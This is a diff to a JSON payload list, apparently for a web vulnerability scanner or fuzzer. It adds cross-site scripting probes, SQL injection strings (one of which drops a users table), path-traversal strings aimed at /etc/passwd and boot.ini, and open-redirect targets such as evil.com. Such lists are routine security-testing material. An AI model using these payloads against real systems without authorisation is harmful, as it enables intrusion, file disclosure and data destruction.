@@ -1,4 +1,30 @@
 {
-    "xss": ["<script>alert(1)</script>", "'><svg onload=alert(1)>"],
-    "sqli": ["' OR '1'='1", "'; DROP TABLE users; --"]
+    "xss": [
+        "<script>alert(1)</script>",
+        "'><svg onload=alert(1)>",
+        "<img src=x onerror=alert(1)>",
+        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+        "<svg><script>confirm(1)</script>",
+        "<body onload=alert(1337)>"
+    ],
+    "sqli": [
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "' OR 1=1--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' OR '1'='1' --",
+        "' AND (SELECT SUBSTRING(@@version,1,1))='5"
+    ],
+    "lfi": [
+        "../../../../etc/passwd",
+        "../../boot.ini",
+        "../../../../../../../../etc/passwd",
+        "../../../../../../../../boot.ini"
+    ],
+    "redirect": [
+        "https://evil.com",
+        "//evil.com",
+        "http://malicious.site",
+        "///attacker.com"
+    ]
 }
